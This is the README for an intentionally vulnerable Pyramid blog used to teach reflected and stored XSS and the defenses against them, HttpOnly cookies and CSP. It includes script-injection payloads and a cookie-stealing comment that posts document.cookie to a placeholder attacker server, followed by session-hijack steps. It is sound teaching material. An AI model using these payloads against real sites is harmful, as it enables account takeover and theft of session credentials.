XSS Demo
========

Example application and scripts to demonstrate some XSS vulnerabilities.

The vulnerable Pyramid application (a blog where the administrator can post new
entries and were anyone can add comments) can be found in the app/
subdirectory.


Setup
-----

This setup was tested on Ubuntu 15.10 and it should work out of the box on any
recent Debian based Linux distribution (with Python 3). Setting it up on other
Operating Systems should not be a problem but the instructions need to be
adapted.

**bcrypt** is used as a dependency. This requires **libffi-dev** to be
installed:

```bash
sudo apt-get install libffi-dev
```

To start the application clone the repository and setup a Python virtualenv:

```bash
mkdir xss-demo && cd xss-demo
git clone https://github.com/omarkohl/xss-demo.git
virtualenv -p python3 venv
source venv/bin/activate
pip install -U setuptools && pip install -U pip
cd xss-demo/app
pip install -r dev_requirements.txt
python setup.py develop
```

Now you can start the application:

```bash
pserve development.ini
```

and access it in your browser on http://localhost:6543


Running
-------

The application is a simple blog where the Administrator can publish new
blogposts and anyone can add comments to the posts. There is a search function
that does nothing except show a XSS vulnerability.

Several blogposts and comments are set up on application startup out of the
box.  The *database* (just in memory) is reset on every application start. The
secret key used to sign the cookies is also reset on every application start.

### Adding a comment

To add a comment simply click on any of the blogposts and use the form at the bottom. The comments will be displayed in chronological order.

### Logging in / Adding a post

To add a blogpost you need to log in with user *Administrator* and password *top-secret* .

Then click on the **Add Post** link in the menu and fill out the form.

Currently there is no visual feedback to tell you you are logged in. But you
can check your Browsers Developer Console to see that a Cookie was set.

### Searching

Currently the search is not linked anywhere but you can access it directly via URL: http://localhost:6543/search?q=myquery

Replace myquery with your searchterm. Nothing will be returned except an emtpy page displaying your searchterm. The purpose is to demonstrate a reflected XSS vulnerability (see below).


XSS
---

There are basically two types of XSS: Server and Client XSS. Each type can again be subdivided into Stored and Reflected XSS.

| **XSS**       | **Server**                | **Client**                |
| ------------- | ------------------------- | ------------------------- |
| **Stored**    | Stored Server XSS         | Stored Client XSS         |
| **Reflected** | Reflected Server XSS      | Reflected Client XSS      |

The *DOM based XSS* you might read about elsewhere is a subset of *Client XSS*.

See [OWASPs Types of XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting) for more information.

This probject currently only shows examples of *Server XSS*. Feel free to
expand it to included *Client XSS* examples and send me a pull request.


Example of Reflected Server XSS
-------------------------------

The search functionality previously mentioned is an example of *Reflected
Server XSS*.

Reflected because the user data is simply reflected (returned) by the server and not stored. *Server XSS* because the flaw that allows for XSS to happen is on the server. The returned HTML contains code that is not properly encoded/escaped.

Open the following link:

```
http://localhost:6543/search?q=<script>alert(1)</script>
```

You should now see a JavaScript alert box with the number 1. If this is not displayed this is probably because your browser is too smart and prevents the attack. Open your Developer Console (Ctrl+Shift+I in Google Chrome) and look for a warning similar to this one:

> The XSS Auditor refused to execute a script in
> 'http://localhost:6543/search?q=%3Cscript%3Ealert(1)%3C/script%3E' because
> its source code was found within the request. The auditor was enabled as the
> server sent neither an 'X-XSS-Protection' nor 'Content-Security-Policy'
> header.

The big disadvantage of *Reflected XSS* (from the the attackers point of view)
is that you need to get the link to your victim. This required extra effort
(e.g. a phishing e-mail) and not as many users will be affected as with *Stored
XSS*. Plus it is comparatively easy for the browser to detect and block.


Example of Stored Server XSS
----------------------------

The blogpost comments are an example of *Stored Server XSS*. Stored because the
comments are stored in the database of the application (even though in this
case the database is volatile and is reset on application startup) and *Server*
because the vulnerability is in Server-side code.

Open one of the posts and add the following text as comment:

```
Great work!
<script>
alert(1)
</script>
```

After saving the comment the blogpost will be reloaded and all comments
(including yours) will be displayed. This means the JavaScript is run and an
alert with content 1 should be displayed. Note that unlike the *Reflected XSS*
example above the browser can do nothing to prevent the code from running. The
Browser is not able to distinguish between legitimate code sent by the server
and the code you just injected (because actually both are sent by the server!).

In the *Reflected XSS* example the code is also sent by the server but since
the browser has the data you just injected in the URL it is able to search for
that data in the returned content and *guesses* that you are being attacked.


Cookie stealing
---------------

Now a more complete example. We are assuming two participants: An administrator
(the victim) and an attacker. If you want to try this example on your own it is
best to use two different browsers or different sessions of the same browser
(e.g. private mode).


### 1. Attacker

The attacker first starts the script **hacker_server.py**:

```bash
./scripts/hacker_server.py
```

This script is a simple HTTP server that will receive data from the hacked site
and print it on the console.

Check your IP address (**ifconfig** command on Linux) and remember this value
along with the port 8000 (where the hacker_server is running).

Then go to the *XSS Demo* site (for this the Administrator has to tell you the
IP address of his machine).

http://<BLOG-IP>:6543

Open any of the blog post and post a comment with following content:

```html
Very interesting article!
<script>
$.post('http://<HACKER-SERVER-IP>:8000/cookie', {username: 'Administrator', cookie: document.cookie});
</script>
```

If both the site and the *hacker server* are running on your machine you can
use **localhost* as IP address in both cases.


### 2. Administrator

The administrator logs into the application:

http://localhost:6543/login
Username: administrator
Password: top-secret

You can check that you are correctly logged in by creating a new blog post. You
can see the cookie created by the application in yours browsers Developer
Console. This cookie is sent by the browser to the server in every request to
authenticate you as the administrator. This means anyone who has this cookie
will be able to execute all administrator actions (such as creating a new blog
post). That is why the cookie needs to be kept secret. We will see how the
attacker can steal the cookie using XSS.

Now navigate to the blogpost that the attacker compromised (by adding an
*infected* comment). Thats it! The attacker has received your cookie and you
didn't even notice.


### 3. Attacker

Check the output of the console where the *hacker_server* is running and you should see something like this:

```
Data sent from: http://<BLOG-IP>:6543/post/2 at 2016-03-13 11:08:52.000745
Administrator has cookie with value:
auth_tkt=c78de49ca2ad3789d5531cbcce7f509956e539acQWRtaW5pc3RyYXRvcg%3D%3D!userid_type:b64unicode
```

Simply set this cookie in your browser when accessing the site and you will be logged in as administrator.

This can be done in Google Chrome by navigating to the site and typing the following into the address bar:

```
javascript:document.cookie="auth_tkt=c78de49ca2ad3789d5531cbcce7f509956e539acQWRtaW5pc3RyYXRvcg%3D%3D!userid_type:b64unicode"
```

Then return to the site and voilà you are logged in.


HttpOnly
--------

There are plenty of possible attacks you can perform with XSS (e.g. replace the
login form so that all data is sent to your *hacker server*) but this
particular cookie stealing was only possible because the Cookie was not marked
as **HttpOnly**.

In general you should always mark your Cookies as HttpOnly because usually you
don't need to access the cookies from JavaScript. While you need to make sure
that there are no XSS vulnerabilities in your site this way you also avoid
cookie stealing in case you missed something. This approach is generally known
as *defense in depth*. In case one layer of security fails you have other
layers in place to protect you.

In this particular application you can enable HttpOnly cookies by opening
**app/xss_demo_/__init__.py** and replacing:

```python
authn_policy = AuthTktAuthenticationPolicy(secret)
```

with

```python
authn_policy = AuthTktAuthenticationPolicy(secret, http_only=True)
```

Now restart the blog server and try the cookie stealing attack described above.
It will no longer work.


CSP Content Security Policies
-----------------------------

Content Security Policy is a security standard introduced in 2004 and is now
widely supported in modern browsers. Its purpose is to prevent XSS and similar
attacks.

It works by informing the browser what scripts (and fonts etc.) are allowed to
be executed, where they are allowed to be loaded from and what connections are
allowed. This is done by a special HTTP header set by the server.

You can test it by editing the **post** view in **app/xss_demo/views.py**:

```python
@view_config(route_name='post', renderer='templates/post.pt')
def post(request):
    post_id = int(request.matchdict['id'])
    post = DB.get(Post, post_id)
    ...
```

Simply add a call to the **_add_csp_header_hard** method:

```python
@view_config(route_name='post', renderer='templates/post.pt')
def post(request):
    _add_csp_header_hard(request)
    post_id = int(request.matchdict['id'])
    post = DB.get(Post, post_id)
    ...
```

Not reload the blog application and try opening a single blogpost in the
browser. You will see a *broken* page because several stylesheets, scripts and
fonts need to be loaded from external CDNs.

You can also open your browsers Developer Console to see the reason your
browsers is blocking this content.

Replace the **_add_csp_header_hard** call with **_add_csp_header** and the page
will work.

Reload the server and try the cookie stealing attack from above. It will fail.

Ideally you should strive to remove *unsafe-inline* from the CSP header because
then you are a lot safer from XSS attacks (even if you have XSS vulnerabilities
in the application).


Links & Acknowledgements
========================

Videos
------

* [OWASP AppSecUSA 2012: Unraveling Some of the Mysteries around DOM-Based XSS (Dave Wichers)](https://www.youtube.com/watch?v=dMpuVnpfJMU)
* [Advanced XSS - Robert Grosse - 2013-2-5](https://www.youtube.com/watch?v=E7SLMN_8mNk)
* [Exploiting XSS: What Tesco doesn't understand about web security (but you probably should) (Troy Hunt)](https://www.youtube.com/watch?v=gZ1mM6OtXIc)
* [Revisiting XSS Sanitization (Ashar Javed)](https://www.youtube.com/watch?v=LLtOJNeMp7c)
* [Black Hat 2013 - The Web IS Vulnerable: XSS Defense on the BattleFront (Ryan Barnett & Greg Wroblewski)](https://www.youtube.com/watch?v=6QOiVoDm5IM)


Reading
-------

* [XSS overview by OWASP (Open Web Application Security Project)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting)


Acknowledgements
----------------

* Template used for the example application by *Start Bootstrap*. [Blog Home](http://startbootstrap.com/template-overviews/blog-home/) and [Blog Post](http://startbootstrap.com/template-overviews/blog-post/)
* [Pyramid Framework](http://www.pylonsproject.org/): A great Python Web-Framework you should try!
* Python UserGroup Freiburg. [Visit us!](http://www.meetup.com/Python-User-Group-Freiburg/)
